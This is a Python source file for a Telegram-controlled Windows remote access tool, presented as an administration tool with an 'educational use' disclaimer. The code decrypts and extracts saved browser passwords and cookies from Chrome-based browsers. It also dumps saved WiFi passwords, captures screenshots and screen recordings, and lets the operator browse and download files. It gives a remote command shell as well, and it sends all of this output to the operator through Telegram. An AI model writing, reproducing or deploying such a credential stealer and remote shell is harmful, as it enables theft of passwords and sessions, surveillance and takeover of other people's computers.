import telebot
import subprocess
import os
import threading
import cv2
import numpy as np
import pyautogui
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from PIL import ImageGrab
import shutil
import sqlite3
import json
import base64
import win32crypt
from Cryptodome.Cipher import AES
import sys

# Replace with your bot token
BOT_TOKEN = ""
USER_ID = 

bot = telebot.TeleBot(BOT_TOKEN)

recording = False
video_filename = "screen_record.avi"
user_paths = {}
def show_welcome_message(chat_id):
    welcome_message = """
🔹 *Remote Administration Tool* 🔹

*Developed by Tintumon from Kerala*

"I'm a hacker but not just a hacker,
a developer but not just a developer -
I create hacking tools that push boundaries."

📌 *About This Tool:*
This is a powerful remote administration tool that provides various system control features through Telegram. Use it responsibly and only on systems you own or have permission to access.

⚠ *Disclaimer:*
This tool is for educational and authorized administrative purposes only. Unauthorized access to computer systems is illegal.


"""

    features = """
    🔹 *Features Overview:*

1. 📌 *IP Config* - View network configuration
2. 📡 *WiFi Profiles* - List saved WiFi networks
3. 🔐 *WiFi Passwords* - Extract saved WiFi passwords
4. 📋 *Task List* - View running processes
5. 🌐 *Netstat* - Show network connections
6. 👥 *Users* - List logged in users
7. 🛠 *Installed Apps* - View installed programs
8. 📸 *Screenshot* - Capture screen
9. 📂 *Download File* - Access file system
10. 🎥 *Screen Record* - Record screen activity
11. 🔴 *Shutdown* - Shutdown the system
12. ♻ *Restart* - Restart the system
13. 🔹 *CMD Access* - Execute commands directly
14. 🔓 *Extract Browser Passwords* - Get saved browser credentials
15. 🍪 *Extract Browser Cookies* - Retrieve browser cookies
"""

    usage_guide = """
🔹 *How to Use:*
Simply select an option from the menu below. For file operations, you can navigate through the file system.

⚠ *Important Notes:*
- Some operations may require admin privileges
- Browser password extraction works for Chrome-based browsers
- Screen recording may be resource intensive
"""

    bot.send_message(chat_id, welcome_message, parse_mode="Markdown")

    bot.send_message(chat_id, features, parse_mode="Markdown")


    bot.send_message(chat_id, usage_guide, parse_mode="Markdown")


    show_menu(chat_id)


@bot.message_handler(func=lambda message: message.chat.id == USER_ID)
def command_handler(message):
    if message.text == "/start" or message.text == "/help":
        show_welcome_message(message.chat.id)

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)

def get_wifi_passwords():
    output = run_command("netsh wlan show profiles")
    profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]

    wifi_details = "🔐 Saved WiFi Passwords:\n"
    for profile in profiles:
        password_cmd = f'netsh wlan show profile "{profile}" key=clear'
        password_output = run_command(password_cmd)
        password_lines = [line.split(":")[1].strip() for line in password_output.split("\n") if "Key Content" in line]
        password = password_lines[0] if password_lines else "No Password Found"
        wifi_details += f"📶 {profile}: {password}\n"

    return wifi_details if profiles else "❌ No saved WiFi networks found."

def capture_screenshot():
    screenshot_path = "screenshot.png"
    img = ImageGrab.grab()
    img.save(screenshot_path)
    return screenshot_path

def record_screen():
    global recording
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_filename, fourcc, 10, screen_size)

    while recording:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    out.release()

def send_long_message(chat_id, text):
    MAX_LENGTH = 4000
    for i in range(0, len(text), MAX_LENGTH):
        bot.send_message(chat_id, f"```\n{text[i:i+MAX_LENGTH]}\n```", parse_mode="Markdown")

def show_menu(chat_id):
    markup = InlineKeyboardMarkup()

    buttons = [
        ("📌 IP Config", "ipconfig"),
        ("📡 WiFi Profiles", "wifi_profiles"),
        ("🔐 WiFi Passwords", "wifi_passwords"),
        ("📋 Task List", "tasklist"),
        ("🌐 Netstat", "netstat"),
        ("👥 Users", "users"),
        ("🛠 Installed Apps", "installed_apps"),
        ("📸 Screenshot", "screenshot"),
        ("📂 Download File", "download"),
        ("🎥 Screen Record", "screen_record_menu"),
        ("🔴 Shutdown", "shutdown"),
        ("♻ Restart", "restart"),
        ("🔹 CMD Access", "cmd_access"),
        ("🔓 Extract Browser Passwords", "extract_passwords"),
        ("🍪 Extract Browser Cookies", "extract_cookies"),
    ]

    for text, callback in buttons:
        markup.add(InlineKeyboardButton(text, callback_data=callback))

    bot.send_message(chat_id, "🔹 *Select an Option:*", reply_markup=markup, parse_mode="Markdown")

def list_files(chat_id, path=None):
    try:
        if not path:
            drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
            user_paths[chat_id] = None
            items = drives
        else:
            if not os.path.exists(path):
                bot.send_message(chat_id, f"❌ Path not found: {path}")
                return
            user_paths[chat_id] = path
            items = os.listdir(path)

        markup = InlineKeyboardMarkup()
        if path:
            parent_dir = os.path.dirname(path)
            if parent_dir != path:
                markup.add(InlineKeyboardButton("🔙 Back", callback_data=f"back:{parent_dir}"))

        for item in items:
            full_path = os.path.join(path, item) if path else item
            if os.path.isdir(full_path):
                markup.add(InlineKeyboardButton(f"📂 {item}", callback_data=f"folder:{full_path}"))
            else:
                markup.add(InlineKeyboardButton(f"📄 {item}", callback_data=f"file:{full_path}"))

        bot.send_message(chat_id, f"📂 Current Path: {path if path else 'Drives'}", reply_markup=markup)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

def execute_cmd(message):
    chat_id = message.chat.id
    command = message.text

    if command.lower() in ["exit", "quit"]:
        bot.send_message(chat_id, "❌ *CMD Access Closed.*", parse_mode="Markdown")
        return

    output = run_command(command)
    send_long_message(chat_id, output)
    bot.send_message(chat_id, "✅ *Enter another command or type 'exit' to close CMD access.*", parse_mode="Markdown")
    bot.register_next_step_handler_by_chat_id(chat_id, execute_cmd)

def get_master_key(browser_user_data_path):
    local_state_path = os.path.join(browser_user_data_path, "Local State")
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:

        return None

def decrypt_chrome_password(encrypted_password, master_key):
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        else:
            return str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
    except Exception as e:

        return None

def find_chrome_profiles(browser_user_data_path):
    profiles = []
    if not os.path.exists(browser_user_data_path):

        return []

    common_profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Guest Profile"]
    for profile in common_profiles:
        profile_path = os.path.join(browser_user_data_path, profile, "Login Data")
        if os.path.exists(profile_path):
            profiles.append(profile_path)

    for item in os.listdir(browser_user_data_path):
        if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_user_data_path, item)):
            login_data_path = os.path.join(browser_user_data_path, item, "Login Data")
            if login_data_path not in profiles and os.path.exists(login_data_path):
                profiles.append(login_data_path)

    return profiles

def extract_chrome_passwords(db_path, master_key):
    temp_path = db_path + "_copy"
    try:
        shutil.copy2(db_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = cursor.fetchall()

        passwords = []
        for row in data:
            site, username, encrypted_password = row
            if username and encrypted_password:
                decrypted_password = decrypt_chrome_password(encrypted_password, master_key)
                if decrypted_password:
                    passwords.append({"site": site, "username": username, "password": decrypted_password})

        conn.close()
        os.remove(temp_path)
        return passwords
    except Exception as e:

        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass
        return []

def extract_browser_passwords():
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
    }

    all_passwords = []
    for browser_name, browser_path in browsers.items():

        if not os.path.exists(browser_path):

            continue

        master_key = get_master_key(browser_path)
        if not master_key:

            continue

        profiles = find_chrome_profiles(browser_path)
        if not profiles:

            continue

        for db_path in profiles:

            passwords = extract_chrome_passwords(db_path, master_key)
            if passwords:
                all_passwords.extend(passwords)

    if all_passwords:
        result = "🔓 *Extracted Browser Passwords:*\n\n"
        for entry in all_passwords:
            result += f"🌐 *Site:* {entry['site']}\n👤 *Username:* {entry['username']}\n🔑 *Password:* {entry['password']}\n\n"
        return result
    else:
        return "❌ No saved passwords found."

def extract_chrome_cookies(db_path, master_key):
    temp_path = db_path + "_copy"
    try:

        shutil.copy2(db_path, temp_path)

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()


        tables = ["cookies", "moz_cookies"]
        cookies = []

        for table in tables:
            try:
                cursor.execute(f"SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM {table}")
                data = cursor.fetchall()

                for row in data:
                    try:
                        host, name, encrypted_value, path, expires, secure = row
                        if encrypted_value:
                            decrypted_value = decrypt_chrome_password(encrypted_value, master_key)
                            if decrypted_value:
                                cookies.append({
                                    "domain": host,
                                    "name": name,
                                    "value": decrypted_value,
                                    "path": path,
                                    "expires": expires,
                                    "secure": bool(secure)
                                })
                    except Exception as e:

                        continue

            except sqlite3.OperationalError:
                continue

        conn.close()
        os.remove(temp_path)
        return cookies

    except Exception as e:

        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass
        return []

def find_chrome_cookie_db(browser_user_data_path):
    profiles = []
    if not os.path.exists(browser_user_data_path):

        return []

    possible_locations = [
        os.path.join(browser_user_data_path, "Default", "Network", "Cookies"),
        os.path.join(browser_user_data_path, "Profile *", "Network", "Cookies"),
        os.path.join(browser_user_data_path, "Default", "Cookies"),
        os.path.join(browser_user_data_path, "Cookies")
    ]

    common_profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Guest Profile"]
    for profile in common_profiles:
        cookie_path = os.path.join(browser_user_data_path, profile, "Network", "Cookies")
        if os.path.exists(cookie_path):
            profiles.append(cookie_path)


    for location in possible_locations:
        if "*" in location:

            import glob
            matches = glob.glob(location)
            profiles.extend([match for match in matches if os.path.exists(match) and match not in profiles])
        elif os.path.exists(location) and location not in profiles:
            profiles.append(location)


    return profiles

def extract_browser_cookies():
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data")
    }

    all_cookies = []
    for browser_name, browser_path in browsers.items():


        if not os.path.exists(browser_path):

            continue

        try:
            master_key = get_master_key(browser_path)
            if not master_key:

                continue

            cookie_dbs = find_chrome_cookie_db(browser_path)
            if not cookie_dbs:

                continue

            for db_path in cookie_dbs:

                cookies = extract_chrome_cookies(db_path, master_key)
                if cookies:

                    all_cookies.extend(cookies)

        except Exception as e:

            continue

    if all_cookies:

        cookies_by_domain = {}
        for cookie in all_cookies:
            if cookie['domain'] not in cookies_by_domain:
                cookies_by_domain[cookie['domain']] = []
            cookies_by_domain[cookie['domain']].append(cookie)


        result = "🍪 *Extracted Browser Cookies:*\n\n"
        for domain, cookies in cookies_by_domain.items():
            result += f"🌐 *Domain:* {domain}\n"
            for cookie in cookies:
                result += f"  🔹 *{cookie['name']}*: {cookie['value']}\n"
                result += f"    Path: {cookie['path']} | Secure: {'Yes' if cookie['secure'] else 'No'}\n"
            result += "\n"


        result += f"\n📊 Total cookies extracted: {len(all_cookies)}"
        return result

    else:
        return "❌ No cookies found or could not decrypt any cookies."

@bot.message_handler(func=lambda message: message.chat.id == USER_ID)
def command_handler(message):
    if message.text == "/start" or message.text == "/help":
        show_menu(message.chat.id)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global recording
    chat_id = call.message.chat.id
    command = call.data

    if command == "ipconfig":
        output = run_command("ipconfig")
    elif command == "wifi_profiles":
        output = run_command("netsh wlan show profiles")
    elif command == "wifi_passwords":
        output = get_wifi_passwords()
    elif command == "tasklist":
        output = run_command("tasklist")
    elif command == "netstat":
        output = run_command("netstat -an")
    elif command == "users":
        output = run_command("query user")
    elif command == "installed_apps":
        output = run_command('wmic product get name')
    elif command == "screenshot":
        screenshot_path = capture_screenshot()
        bot.send_photo(chat_id, open(screenshot_path, "rb"))
        os.remove(screenshot_path)
        show_menu(chat_id)
        return
    elif command == "shutdown":
        output = run_command("shutdown /s /t 10")
    elif command == "restart":
        output = run_command("shutdown /r /t 10")
    elif command == "download":
        list_files(chat_id)
        return
    elif command.startswith("folder:"):
        folder_path = command.split("folder:")[1]
        list_files(chat_id, folder_path)
        return
    elif command.startswith("file:"):
        file_path = command.split("file:")[1]
        try:
            bot.send_document(chat_id, open(file_path, "rb"))
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error: {str(e)}")
        show_menu(chat_id)
        return
    elif command.startswith("back:"):
        prev_path = command.split("back:")[1]
        list_files(chat_id, prev_path if prev_path else None)
        return
    elif command == "screen_record_menu":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("▶ Start Recording", callback_data="start_recording"))
        markup.add(InlineKeyboardButton("⏹ Stop Recording", callback_data="stop_recording"))
        bot.send_message(chat_id, "🎥 *Screen Recording Options:*", reply_markup=markup, parse_mode="Markdown")
        return
    elif command == "start_recording":
        if not recording:
            recording = True
            bot.send_message(chat_id, "🎥 *Screen recording started...*")
            threading.Thread(target=record_screen).start()
        else:
            bot.send_message(chat_id, "⚠ *Screen recording is already running.*")
        show_menu(chat_id)
        return
    elif command == "stop_recording":
        if recording:
            recording = False
            bot.send_message(chat_id, "⏹ *Screen recording stopped.* Sending file...")
            bot.send_video(chat_id, open(video_filename, "rb"))
            os.remove(video_filename)
        else:
            bot.send_message(chat_id, "⚠ *No active recording to stop.*")
        show_menu(chat_id)
        return
    elif command == "cmd_access":
        bot.send_message(chat_id, "🖥 *CMD Access Enabled*\n\nEnter your command:", parse_mode="Markdown")
        bot.register_next_step_handler_by_chat_id(chat_id, execute_cmd)
        return
    elif command == "extract_passwords":
        output = extract_browser_passwords()
    elif command == "extract_cookies":
        output = extract_browser_cookies()
    else:
        output = "❌ Unknown command."

    send_long_message(chat_id, output)
    show_menu(chat_id)


bot.polling()
